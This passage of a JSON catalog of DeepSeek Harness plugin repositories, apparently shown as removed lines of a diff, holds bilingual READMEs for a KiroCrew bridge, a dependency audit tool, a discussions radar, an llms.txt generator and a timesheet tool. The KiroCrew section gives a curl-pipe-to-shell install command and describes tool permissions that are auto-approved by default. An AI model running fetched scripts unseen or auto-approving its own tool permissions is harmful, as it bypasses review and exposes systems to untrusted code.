kiro-cli (is kiro-cli installed and on PATH?)`**\n\nThe bridge could not find `kiro-cli`. Install KiroCrew, make sure `kiro-cli` is\non `PATH`, and sign in (`kiro-cli` guides device-code sign-in on first run).\nYou can point the plugin at an explicit path with `\"bin\": \"/absolute/kiro-cli\"`.\n\n**`kiro-cli exited before the turn completed`**\n\n`kiro-cli acp` failed during the handshake or turn. Re-run `kiro-cli` directly\nto confirm it is signed in, then check the stderr tail included in the error.\n\n**`request cancelled or timed out`**\n\nThe turn exceeded `timeoutMs`. Raise it for long-running unattended tasks.\n\n## Development\n\n```bash\npnpm install --frozen-lockfile\npnpm typecheck\npnpm build\npnpm test\npnpm pack\n```\n\nTests cover the ACP protocol (handshake, text-chunk collection, thinking-chunk\nskip, permission allow/deny, error paths) without requiring a live KiroCrew.\nThe stdio transport's failure path is also verified (missing binary).\n\n## Honest status\n\nThis is a community plugin, not an official DeepSeek or KiroCrew project. It is\nverified at the protocol and transport-failure level; a live end-to-end run\nrequires your own `kiro-cli` installation and sign-in.\n\n## License\n\nMIT\n\n---\n\n# dsh-kirocrew（中文）\n\n把 **KiroCrew** 桥接进 **DeepSeek Harness**：让 `dsh` 的 agent 通过\n[ACP](https://agentclientprotocol.com)（stdio 上的 JSON-RPC 2.0）把一次对话委托给一个\n持久的、自我进化的开发工作区。\n\n> **KiroCrew** 是一个跑在你自己的硬件上、跨会话记住上下文、并能无人值守继续工作的\n> 开源开发工作区。本插件把它暴露成一个 `kiro_send` 工具。\n\n## 作用\n\n- 注册一个面向模型的工具：**`kiro_send`**。\n- 它启动 `kiro-cli acp`，完成 ACP 握手（`initialize → session/new → session/prompt`），\n  转发你的提示词，收集 agent 的文本分块，返回最终文本。\n- 默认自动批准 ACP 的 `session/request_permission`（`allow_once`）；设\n  `autoApproveTools: false` 改为拒绝。\n\n这是一个**轻薄、诚实的桥接**：转发提示词、返回文本，并不重新实现 KiroCrew。\n\n## 前置条件\n\n- Node.js 18+\n- 已安装并登录 `kiro-cli`（KiroCrew 的 CLI，ACP 后端就是 `kiro-cli acp`）\n\n安装 KiroCrew（macOS / Linux / Windows WSL）：\n\n```bash\ncurl -fsSL https://download.crew.kiro.dev/cli.sh | sh\n```\n\n桌面应用、Docker、Windows 源码安装见\n[KiroCrew 仓库](https://github.com/kirodotdev/KiroCrew)。\n\n## 安装\n\n```bash\ndsh plugin add dsh-kirocrew\n```\n\n或全局安装：\n\n```bash\nnpm install -g dsh-kirocrew\n```\n\n## 使用\n\n```text\n你：kiro_send(\"写一个会失败的测试，然后修好它\")\n```\n\n配置（插件 config）：\n\n```jsonc\n{\n  \"bin\": \"kiro-cli\",          // 可选：kiro-cli 路径\n  \"cwd\": \"/path/to/work\",     // 可选：会话工作目录\n  \"mode\": \"coder\",            // 可选：KiroCrew agent 模式 id\n  \"model\": \"anthropic/...\",   // 可选：模型 id\n  \"timeoutMs\": 120000,        // 可选：单轮超时\n  \"autoApproveTools\": true    // 可选：自动批准工具权限\n}\n```\n\n`kiro_send` 也支持按调用覆盖 `cwd`、`mode`、`model`。\n\n## 排障\n\n**`failed to spawn kiro-cli (is kiro-cli installed and on PATH?)`**\n\n找不到 `kiro-cli`。请安装 KiroCrew，确认 `kiro-cli` 在 `PATH` 上并已登录。也可以用\n`\"bin\": \"/absolute/kiro-cli\"` 指定绝对路径。\n\n**`kiro-cli exited before the turn completed`**\n\n握手或回合失败。请先直接跑一次 `kiro-cli` 确认已登录，再看错误里附带的 stderr 尾部。\n\n**`request cancelled or timed out`**\n\n超过了 `timeoutMs`。长时间无人值守任务可适当调大。\n\n## 开发\n\n```bash\npnpm install --frozen-lockfile\npnpm typecheck\npnpm build\npnpm test\npnpm pack\n```\n\n测试在无需真实 KiroCrew 的情况下覆盖 ACP 协议（握手、文本分块收集、思考分块跳过、\n权限批准/拒绝、错误路径），并验证 stdio 传输的失败路径（缺失二进制）。\n\n## 诚实声明\n\n这是社区插件，不是 DeepSeek 或 KiroCrew 官方项目。已在协议与传输失败层面验证；\n完整的端到端运行需要你自己的 `kiro-cli` 安装与登录。\n\n## 许可证\n\nMIT\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-dep-audit",
-      "html_url": "https://github.com/zoahdev/dsh-dep-audit",
-      "description": "Dependency supply-chain hygiene audit for DeepSeek Harness (dsh): peer-range resolvability, broken dist-tag detection, stale/missing-license/non-registry deps, installed-vs-declared drift. Complements dsh-poison-guard and dsh-plugin-doctor.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:30:11Z",
-      "topics": [
-        "deepseek-harness",
-        "dependency-audit",
-        "dsh-plugin",
-        "npm",
-        "security",
-        "supply-chain"
-      ],
-      "categories": [
-        "工具/开发"
-      ],
-      "tags": [
-        "deepseek-harness",
-        "dependency-audit",
-        "dsh-plugin",
-        "npm",
-        "security",
-        "supply-chain"
-      ],
-      "readme_text": "# dsh-dep-audit\n\n[![npm](https://img.shields.io/npm/v/dsh-dep-audit.svg)](https://www.npmjs.com/package/dsh-dep-audit)\n\n[![CI](https://github.com/zoahdev/dsh-dep-audit/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-dep-audit/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nDependency supply-chain hygiene audit for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh) projects and profiles.\n\nIt answers: **“can I trust the dependency graph of this dsh plugin / profile?”** — peer ranges that resolve to nothing, dist-tags that contradict declared ranges, stale or unlicensed dependencies, non-registry sources, and installed versions that silently drifted from what `package.json` declares.\n\nComplements the rest of the zoahdev security suite:\n\n| Tool | Focus |\n|---|---|\n| [dsh-poison-guard](https://github.com/zoahdev/dsh-poison-guard) | malware / obfuscation scan of plugin code |\n| [dsh-plugin-doctor](https://github.com/zoahdev/dsh-plugin-doctor) | publish readiness: manifest/patch/build/pack/install |\n| **dsh-dep-audit** | dependency graph hygiene: resolvability, dist-tags, staleness, sources, licenses, drift |\n\n## Install\n\n```sh\ndsh plugin add dsh-dep-audit\n```\n\nOr run it standalone without installing into dsh:\n\n```sh\nnpx dsh-dep-audit .\n```\n\n## Checks\n\n| Check | What it verifies | Status when triggered |\n|---|---|---|\n| `manifest` | `package.json` exists, parses, declares `name` / `version` | fail |\n| `peer-resolvable` | every `peerDependencies` range matches at least one published version on the registry | fail |\n| `dist-tag` | `dist-tags.latest` does not contradict a declared range (the broken-`latest` / ERESOLVE class, e.g. [discussion #2763](https://github.com/deepseek-ai/deepseek-harness/discussions/2763)) | warn |\n| `source` | audited dependencies use registry specifiers, not `git:` / `file:` / `link:` / `workspace:` | warn |\n| `license` | registry dependencies declare a license in their latest published metadata | warn |\n| `freshness` | registry dependencies have a release within the last 365 days (configurable) | warn |\n| `drift` | installed versions in `node_modules` satisfy the declared ranges (ERESOLVE / host-shadowing class) | fail |\n| `outdated` | installed versions are not behind the registry `latest` | warn |\n\n`ok` is `true` only when every check passes (no fail items). Warnings are real signals but not blockers.\n\n## CLI\n\n```sh\ndsh-dep-audit [dir] [options]\n\n  --json               print the machine-readable report\n  --offline            skip registry network calls\n  --all                include devDependencies\n  --registry <url>     npm registry base URL (default: NPM_CONFIG_REGISTRY or registry.npmjs.org)\n  --stale-days <n>     warn when latest release is older than n days (default 365)\n  --help               show help\n```\n\nExit codes: `0` all pass, `1` at least one fail, `2` usage/IO error.\n\n```sh\nnpx dsh-dep-audit . --json\nnpx dsh-dep-audit ~/.dsh/profiles/web --offline\n```\n\n## In-harness usage (agent-callable)\n\nAfter install, ask your dsh agent:\n\n> 审计一下当前插件的依赖健康：`dep_audit`，目录指向项目根目录。\n> Run a dependency audit on this plugin: `dep_audit` with `dir` set to the project root.\n\nThe agent calls the `dep_audit` tool (`dir`, optional `options`), which returns a `dsh-dep-audit/v1` report:\n\n```json\n{\n  \"schema\": \"dsh-dep-audit/v1\",\n  \"target\": \".\",\n  \"offline\": false,\n  \"ok\": true,\n  \"summary\": { \"total\": 8, \"pass\": 8, \"warn\": 0, \"fail\": 0 },\n  \"checks\": [ ... ]\n}\n```\n\n## Examples\n\nAudit a profile without network access:\n\n```sh\nnpx dsh-dep-audit ~/.dsh/profiles/web --offline\n```\n\nGate CI on dependency hygiene:\n\n```yaml\n- run: npx dsh-dep-audit .\n```\n\n## Why it exists\n\n- pnpm can silently link an older RC into a plugin's peer slot; **“loads fine” ≠ “matches the declared peer range”**. `drift` turns that precondition into a checked fact.\n- The npm `latest` dist-tag can point at an old, broken build while `next` has the real release — `dsh plugin add <name>` then resolves something unexpected for everyone. `dist-tag` flags the contradiction before it bites (the [discussion #2763](https://github.com/deepseek-ai/deepseek-harness/discussions/2763) failure class).\n- A dependency whose latest release is years old, or that lacks a license, is a red flag in a supply chain that grows by thousands of plugins per week.\n- An unlicensed or stale dependency is not malware — that is poison-guard's job. This plugin is the “healthy diet” half of the supply-chain story.\n\n## Report envelope\n\nEvery check carries `{ id, status, title, detail, items }`; `items` are `{ name, issue, level }` with `level: warn | fail`. The schema version (`dsh-dep-audit/v1`) is stable and machine-readable for CI.\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the [dsh-plugin-doctor](https://github.com/zoahdev/dsh-plugin-doctor) preflight, unit tests, a packed-artifact integration that installs the real tarball and invokes the real `dep_audit` handler, and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-dep-audit（中文）\n\n[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）项目与 profile 的**依赖供应链卫生审计**。\n\n回答一个具体问题：**“这个 dsh 插件 / profile 的依赖图能信吗？”** —— peer 范围在注册表上解析不到、dist-tag 与声明的范围互相矛盾、依赖长期不更新或没有许可证、用了 git/file/workspace 来源，以及安装版本与 `package.json` 声明悄悄漂移。\n\n与 zoahdev 安全套件的分工：\n\n| 工具 | 定位 |\n|---|---|\n| [dsh-poison-guard](https://github.com/zoahdev/dsh-poison-guard) | 插件代码的恶意/混淆扫描 |\n| [dsh-plugin-doctor](https://github.com/zoahdev/dsh-plugin-doctor) | 发布就绪：manifest/patch/build/pack/install |\n| **dsh-dep-audit** | 依赖图卫生：可解析性、dist-tag、过期、来源、许可证、漂移 |\n\n## 安装\n\n```sh\ndsh plugin add dsh-dep-audit\n```\n\n不装进 dsh 也能单独用：\n\n```sh\nnpx dsh-dep-audit .\n```\n\n## 检查项\n\n| 检查 | 验证内容 | 触发级别 |\n|---|---|---|\n| `manifest` | `package.json` 存在、可解析、有 `name` / `version` | fail |\n| `peer-resolvable` | 每个 `peerDependencies` 范围在注册表上至少有一个已发布版本 | fail |\n| `dist-tag` | `dist-tags.latest` 不与声明范围矛盾（坏 `latest` / ERESOLVE 一类，见 [讨论 #2763](https://github.com/deepseek-ai/deepseek-harness/discussions/2763)） | warn |\n| `source` | 依赖使用注册表来源，而非 `git:` / `file:` / `link:` / `workspace:` | warn |\n| `license` | 注册表依赖的最新元数据声明了许可证 | warn |\n| `freshness` | 注册表依赖在 365 天内有新发布（可配置） | warn |\n| `drift` | `node_modules` 里的实际版本满足声明范围（ERESOLVE / 宿主遮蔽类） | fail |\n| `outdated` | 已安装版本不落后于注册表 `latest` | warn |\n\n只有所有检查都没有 fail 项时 `ok` 才为 `true`。warn 是真实信号，但不是硬阻塞。\n\n## CLI\n\n```sh\ndsh-dep-audit [dir] [options]\n\n  --json               输出机器可读报告\n  --offline            跳过注册表网络请求\n  --all                把 devDependencies 也纳入审计\n  --registry <url>     npm 注册表地址（默认 NPM_CONFIG_REGISTRY 或 registry.npmjs.org）\n  --stale-days <n>     超过 n 天未发布即告警（默认 365）\n  --help               帮助\n```\n\n退出码：`0` 全过，`1` 有 fail，`2` 用法/IO 错误。\n\n```sh\nnpx dsh-dep-audit . --json\nnpx dsh-dep-audit ~/.dsh/profiles/web --offline\n```\n\n## 在 harness 内使用（agent 可调用）\n\n装好后对 agent 说：\n\n> 审计一下当前插件的依赖健康：`dep_audit`，目录指向项目根目录。\n\nagent 会调用 `dep_audit` 工具（`dir`，可选 `options`），返回 `dsh-dep-audit/v1` 报告：\n\n```json\n{\n  \"schema\": \"dsh-dep-audit/v1\",\n  \"target\": \".\",\n  \"offline\": false,\n  \"ok\": true,\n  \"summary\": { \"total\": 8, \"pass\": 8, \"warn\": 0, \"fail\": 0 },\n  \"checks\": [ ... ]\n}\n```\n\n## 为什么需要它\n\n- pnpm 可能把旧 RC 静默链进插件的 peer 槽；**“能加载”≠“符合声明的 peer 范围”**。`drift` 把这条前置条件变成可核验的事实。\n- npm 的 `latest` dist-tag 可能指向旧坏包，而 `next` 才是真版本——`dsh plugin add <name>` 会让所有人解析到意外结果。`dist-tag` 在踩坑前先标出矛盾（[讨论 #2763](https://github.com/deepseek-ai/deepseek-harness/discussions/2763) 的失败类别）。\n- 最新版本几年没动、或没有许可证的依赖，在以每周千计增长的插件供应链里都是红旗。\n- 没许可证、长期不更新不等于恶意——那是 poison-guard 的事。本插件负责供应链“健康饮食”这一半。\n\n## 报告结构\n\n每个检查带 `{ id, status, title, detail, items }`；`items` 是 `{ name, issue, level }`，`level` 为 `warn | fail`。schema 版本 `dsh-dep-audit/v1` 稳定、可给 CI 解析。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 [dsh-plugin-doctor](https://github.com/zoahdev/dsh-plugin-doctor) 预检、单元测试、打包集成（真实安装 tarball 并调用真实 `dep_audit` handler）、以及 Windows 上全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosy"
-    },
-    {
-      "full_name": "zoahdev/dsh-discussions-radar",
-      "html_url": "https://github.com/zoahdev/dsh-discussions-radar",
-      "description": "Official GitHub Discussions radar for DeepSeek Harness (dsh): list, filter and search the official discussion boards (Ideas / Q&A / Show Your Plugins! / General / Announcements / Polls). CLI + agent-callable discussions_radar tool, zero runtime deps, read-only.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:31:01Z",
-      "topics": [
-        "community",
-        "deepseek-harness",
-        "discussions",
-        "dsh-plugin",
-        "github",
-        "radar"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "community",
-        "deepseek-harness",
-        "discussions",
-        "dsh-plugin",
-        "github",
-        "radar",
-        "terminal",
-        "agent"
-      ],
-      "readme_text": "# dsh-discussions-radar\n\n[![npm](https://img.shields.io/npm/v/dsh-discussions-radar.svg)](https://www.npmjs.com/package/dsh-discussions-radar)\n\n[![CI](https://github.com/zoahdev/dsh-discussions-radar/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-discussions-radar/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nOfficial GitHub Discussions radar for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh): list, filter and search the official discussion boards — Ideas / Q&A / Show Your Plugins! / General / Announcements / Polls — from inside dsh or the terminal.\n\nThe companion to [dsh-github-release-radar](https://github.com/zoahdev/dsh-github-release-radar): that one watches releases, this one watches the community pulse. Zero runtime dependencies, read-only, public API only.\n\n## Install\n\n```sh\ndsh plugin add dsh-discussions-radar\n```\n\nOr run standalone:\n\n```sh\nnpx dsh-discussions-radar --category \"Show Your Plugins!\" --limit 10\n```\n\n## CLI\n\n```sh\ndsh-discussions-radar [options]\n\n  --repo <owner/repo>   repository to scan (default deepseek-ai/deepseek-harness)\n  --category <name>     filter by exact category (Ideas / Q&A / Show Your Plugins! / General / Announcements / Polls)\n  --query <keyword>     case-insensitive keyword filter on title\n  --limit <n>           max results (default 10)\n  --since <ISO>         only discussions updated at/after this date\n  --json                print the machine-readable dsh-discussions-radar/v1 report\n  --help                show this help\n```\n\nExit codes: `0` results, `1` no results / warnings, `2` usage/IO error.\n\n```sh\nnpx dsh-discussions-radar\nnpx dsh-discussions-radar --category Ideas --limit 5\nnpx dsh-discussions-radar --query \"plugin\" --since 2026-08-01 --json\n```\n\n## In-harness usage (agent-callable)\n\nAsk your dsh agent:\n\n> 官方社区最近有什么新讨论？`discussions_radar`，按更新时间排一下。\n> What's new in the official community? Run `discussions_radar` sorted by activity.\n\nThe tool returns a `dsh-discussions-radar/v1` report:\n\n```json\n{\n  \"schema\": \"dsh-discussions-radar/v1\",\n  \"repo\": \"deepseek-ai/deepseek-harness\",\n  \"ok\": true,\n  \"count\": 10,\n  \"items\": [\n    {\n      \"number\": 3123,\n      \"title\": \"Four new verified plugins: ...\",\n      \"category\": \"Show Your Plugins!\",\n      \"comments\": 1,\n      \"createdAt\": \"2026-08-18T00:00:00Z\",\n      \"updatedAt\": \"2026-08-18T12:00:00Z\",\n      \"url\": \"https://github.com/deepseek-ai/deepseek-harness/discussions/3123\"\n    }\n  ],\n  \"warnings\": [],\n  \"fetchedAt\": \"2026-08-18T12:05:00Z\"\n}\n```\n\n## Why it exists\n\n- The official repo is Discussions-only (no issues); the community pulse lives in these boards, but no dsh plugin surfaced them to the agent.\n- Staying on top of Ideas / Q&A / Show Your Plugins is how plugin authors find gaps and users find answers.\n- Zero runtime dependencies, read-only, works without any API key (public GitHub REST API).\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the dsh-plugin-doctor preflight, unit tests, a packed-artifact integration that calls the real public GitHub API, and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-discussions-radar（中文）\n\n[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）官方 GitHub Discussions 雷达：在 dsh 里或终端里列出、筛选、搜索官方讨论区——Ideas / Q&A / Show Your Plugins! / General / Announcements / Polls。\n\n与 [dsh-github-release-radar](https://github.com/zoahdev/dsh-github-release-radar) 互补：那个看版本发布，这个看社区脉搏。零运行时依赖、只读、只用公开 API。\n\n## 安装\n\n```sh\ndsh plugin add dsh-discussions-radar\n```\n\n独立使用：\n\n```sh\nnpx dsh-discussions-radar --category \"Show Your Plugins!\" --limit 10\n```\n\n## CLI\n\n```sh\ndsh-discussions-radar [options]\n\n  --repo <owner/repo>   要扫描的仓库（默认 deepseek-ai/deepseek-harness）\n  --category <name>     按精确分类过滤（Ideas / Q&A / Show Your Plugins! / General / Announcements / Polls）\n  --query <keyword>     标题关键词过滤（不区分大小写）\n  --limit <n>           最大条数（默认 10）\n  --since <ISO>         只显示该时间后更新过的讨论\n  --json                输出机器可读 dsh-discussions-radar/v1 报告\n  --help                帮助\n```\n\n退出码：`0` 有结果，`1` 无结果/有警告，`2` 用法/IO 错误。\n\n```sh\nnpx dsh-discussions-radar\nnpx dsh-discussions-radar --category Ideas --limit 5\nnpx dsh-discussions-radar --query \"plugin\" --since 2026-08-01 --json\n```\n\n## 在 harness 内使用（agent 可调用）\n\n对 agent 说：\n\n> 官方社区最近有什么新讨论？`discussions_radar`，按更新时间排一下。\n\n工具返回 `dsh-discussions-radar/v1` 报告（结构见英文版 JSON 示例）。\n\n## 为什么需要它\n\n- 官方仓库只用 Discussions（没有 issues）；社区脉搏就在这些板块里，但之前没有 dsh 插件把它暴露给 agent。\n- 跟踪 Ideas / Q&A / Show Your Plugins 是插件作者发现空位、用户找到答案的方式。\n- 零运行时依赖、只读、无需任何 API key（公开 GitHub REST API）。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 dsh-plugin-doctor 预检、单元测试、调用真实公开 GitHub API 的打包集成、以及 Windows 全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosystem tools\n\n- [dsh-dep-audit](https://github.com/zoahdev/dsh-dep-audit) - dependency supply-chain hygiene\n- [dsh-quality-score](https://github.com/zoahdev/dsh-quality-score) - plugin quality scorecard + full-registry leaderboard\n- [dsh-ecosystem](https://github.com/zoahdev/dsh-ecosystem) - health scan, impact, trend, live dashboard\n- [dsh-tutorials](https://github.com/zoahdev/dsh-tutorials) - bilingual plugin pipeline tutorials\n## FAQ\n\n- **How do I install?** dsh plugin add dsh-discussions-radar or run the CLI directly (see README).\n- **Does it need an API key?** No.\n- **Is it read-only?** Yes by default; any write/apply is an explicit flag.\n## Examples\n\nSee the README for full CLI usage. Quick start:\n\n```sh\nnpx dsh-discussions-radar --help\n```\n\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-llms-forge",
-      "html_url": "https://github.com/zoahdev/dsh-llms-forge",
-      "description": "Generate llms.txt for DeepSeek Harness (dsh) plugin repositories from package.json + README — AI-readable discovery files, zero runtime deps. CLI + agent-callable llms_forge tool.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:31:53Z",
-      "topics": [
-        "ai-readable",
-        "deepseek-harness",
-        "documentation",
-        "dsh-plugin",
-        "llms-txt"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "ai-readable",
-        "deepseek-harness",
-        "documentation",
-        "dsh-plugin",
-        "llms-txt",
-        "agent"
-      ],
-      "readme_text": "# dsh-llms-forge\n\n[![npm](https://img.shields.io/npm/v/dsh-llms-forge.svg)](https://www.npmjs.com/package/dsh-llms-forge)\n\n[![CI](https://github.com/zoahdev/dsh-llms-forge/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-llms-forge/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nGenerate **llms.txt** for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh) plugin repositories from `package.json` + `README.md`.\n\nAI agents look for `llms.txt` first when they land in a repository. Most dsh plugins don't have one — this plugin creates it deterministically and keeps it honest: title from the package name, summary from the description (or the README's first paragraph), and key facts (install command, license, homepage, keywords, entry, CLI). Read-only by default; writing is explicit.\n\n## Install\n\n```sh\ndsh plugin add dsh-llms-forge\n```\n\nOr run standalone:\n\n```sh\nnpx dsh-llms-forge .\n```\n\n## CLI\n\n```sh\ndsh-llms-forge [dir] [--write] [--overwrite] [--json]\n```\n\n- Prints the proposed `llms.txt` to stdout (no writes by default).\n- `--write` writes the file; `--overwrite` replaces an existing one.\n- Exit codes: `0` clean, `1` warnings, `2` usage/IO error.\n\n```sh\nnpx dsh-llms-forge . --write --overwrite\nnpx dsh-llms-forge ./my-plugin --json\n```\n\n## In-harness usage (agent-callable)\n\nAsk your dsh agent:\n\n> 给这个插件仓库生成一份 llms.txt：`llms_forge`，目录指向仓库根目录，写入并覆盖。\n> Generate an llms.txt for this plugin repo: `llms_forge` with `dir` set, then `write: true, overwrite: true`.\n\nThe tool returns a `dsh-llms-forge/v1` result with the proposed content and warnings, and writes the file only when `options.write` is true.\n\n## What the generated file looks like\n\n```markdown\n# dsh-dep-audit\n\nDependency supply-chain hygiene audit for DeepSeek Harness ...\n\n## Key facts\n\n- Install: dsh plugin add dsh-dep-audit\n- License: MIT\n- Homepage: https://github.com/zoahdev/dsh-dep-audit\n- Keywords: deepseek-harness, dsh, ...\n- Entry: lib/index.js\n- CLI: dsh-dep-audit\n- Version: 0.1.0\n\n> Generated by dsh-llms-forge. Keep this file in sync with README.md and package.json.\n```\n\n## Why it exists\n\n- The `llms.txt` convention is the fastest way for AI agents to understand a repository, yet most dsh plugins ship without one.\n- Hand-written llms.txt files drift out of date; generated ones are reproducible and CI-checkable (`--json`, exit code).\n- Zero runtime dependencies, read-only by default — safe to run anywhere.\n\n## Development\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI runs the dsh-plugin-doctor preflight, unit tests, packed-artifact integration (real `llms_forge` invocation), and a fresh-profile `dsh web` boot smoke on Windows.\n\n## License\n\nMIT © 2026 zoahdev\n\n---\n\n# dsh-llms-forge（中文）\n\n为 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（dsh）插件仓库**自动生成 llms.txt**（AI 可读发现文件），数据源是 `package.json` + `README.md`。\n\nAI agent 进入仓库时最先找的就是 `llms.txt`，但绝大多数 dsh 插件没有。本插件把它确定性生成并保持诚实：标题取包名，摘要取 description（或 README 第一段），关键事实（安装命令、许可证、主页、关键词、入口、CLI）自动收集。默认只读，写盘需显式开启。\n\n## 安装\n\n```sh\ndsh plugin add dsh-llms-forge\n```\n\n独立使用：\n\n```sh\nnpx dsh-llms-forge .\n```\n\n## CLI\n\n```sh\ndsh-llms-forge [dir] [--write] [--overwrite] [--json]\n```\n\n- 默认只把生成的 `llms.txt` 打印到 stdout，不写盘。\n- `--write` 写盘；`--overwrite` 覆盖已有文件。\n- 退出码：`0` 干净，`1` 有警告，`2` 用法/IO 错误。\n\n```sh\nnpx dsh-llms-forge . --write --overwrite\nnpx dsh-llms-forge ./my-plugin --json\n```\n\n## 在 harness 内使用（agent 可调用）\n\n对 agent 说：\n\n> 给这个插件仓库生成一份 llms.txt：`llms_forge`，目录指向仓库根目录，写入并覆盖。\n\n工具返回 `dsh-llms-forge/v1` 结果（含生成内容与警告），仅在 `options.write` 为 true 时写盘。\n\n## 为什么需要它\n\n- llms.txt 是 AI agent 理解仓库最快的方式，但大多数 dsh 插件没有。\n- 手写 llms.txt 会漂移过期；生成式可复现、可进 CI（`--json` + 退出码）。\n- 零运行时依赖、默认只读，任何环境都能安全跑。\n\n## 开发\n\n```sh\npnpm install\npnpm typecheck\npnpm build\npnpm test\npnpm test:integration\n```\n\nCI 跑 dsh-plugin-doctor 预检、单元测试、打包集成（真实 `llms_forge` 调用）、Windows 全新 profile 的 `dsh web` 启动冒烟。\n\n## 许可证\n\nMIT © 2026 zoahdev\n## Related ecosystem tools\n\n- [dsh-dep-audit](https://github.com/zoahdev/dsh-dep-audit) - dependency supply-chain hygiene\n- [dsh-quality-score](https://github.com/zoahdev/dsh-quality-score) - plugin quality scorecard + full-registry leaderboard\n- [dsh-ecosystem](https://github.com/zoahdev/dsh-ecosystem) - health scan, impact, trend, live dashboard\n- [dsh-tutorials](https://github.com/zoahdev/dsh-tutorials) - bilingual plugin pipeline tutorials\n## FAQ\n\n- **How do I install?** dsh plugin add dsh-llms-forge or run the CLI directly (see README).\n- **Does it need an API key?** No.\n- **Is it read-only?** Yes by default; any write/apply is an explicit flag.\n## Examples\n\nSee the README for full CLI usage. Quick start:\n\n```sh\nnpx dsh-llms-forge --help\n```\n\n"
-    },
-    {
-      "full_name": "zoahdev/dsh-timesheet",
-      "html_url": "https://github.com/zoahdev/dsh-timesheet",
-      "description": "Timesheet for DeepSeek Harness (dsh): turn-based time tracking from session logs — per-day/project/provider/source rollups, tool-call counts, failure rates, time-to-first-token. CLI + agent-callable timesheet tool, zero runtime deps.",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-18T22:30:58Z",
-      "topics": [
-        "deepseek-harness",
-        "dsh-plugin",
-        "productivity",
-        "session-log",
-        "time-tracking",
-        "timesheet"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "deepseek-harness",
-        "dsh-plugin",
-        "productivity",
-        "session-log",
-        "time-tracking",
-        "timesheet",
-        "agent"
-      ],
-      "readme_text": "# dsh-timesheet\n\n[![npm](https://img.shields.io/npm/v/dsh-timesheet.svg)](https://www.npmjs.com/package/dsh-timesheet)\n\n[![CI](https://github.com/zoahdev/dsh-timesheet/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-timesheet/actions)\n[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n[![dsh-plugin](https://img.shields.io/badge/dsh--plugin-verified-blue)](https://github.com/topics/dsh-plugin)\n\nTimesheet for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (dsh): **turn-based time tracking from session logs**.\n\nToken dashboards tell you what you spent; this one tells you **how much wall-clock time** you spent with your agents — totals, per-day, per-project, per-provider, per-source, plus tool-call counts, failure rates, and time-to-first-token. Zero runtime dependencies; reads `*.jsonl` session logs only.\n\n## Install\n\n```sh\ndsh plugin add dsh-timesheet\n```\n\nOr run standalone:\n\n```sh\nnpx dsh-timesheet ~/.codex/sessions\n```\n\n## CLI\n\n```sh\ndsh-timesheet <dir> [--json]\n```\n\n- `dir` must contain `*.jsonl` session logs (e.g. `~/.codex/sessions`, a dsh session directory, or any exported session folder).\n- Prints a Markdown report; `--json` prints the machine-readable `dsh-timesheet/v1` envelope.\n- Exit codes: `0` report generated, `1` no turns found / warnings, `2` usage/IO error.\n\n```sh\nnpx dsh-timesheet ~/.codex/sessions\nnpx dsh-timesheet ~/.codex/sessions --json\n```\n\n## In-harness usage (agent-callable)\n\nAsk your dsh agent:\n\n> 给我出一份时间报表：`timesheet`，目录指向会话日志目录。\n> Give me a timesheet report: `timesheet` with `dir` set to your session-log directory.\n\nThe tool returns a `dsh-timesheet/v1` report:\n\n```json\n{\n  \"schema\": \"dsh-timesheet/v1\",\n  \"target\": \"~/.codex/sessions\",\n  \"ok\": true,\n  \"scannedFiles\": 42,\n  \"sessions\": 42,\n  \"turns\": 310,\n  \"totalDurationMs\": 64800000,\n  \"failedTurns\": 7,\n  \"toolCalls\": 1284,\n  \"byDay\": [ { \"key\": \"2026-08-18\", \"turns\": 22, \"durationMs\": 5400000, \"ttftMs\": 110000, 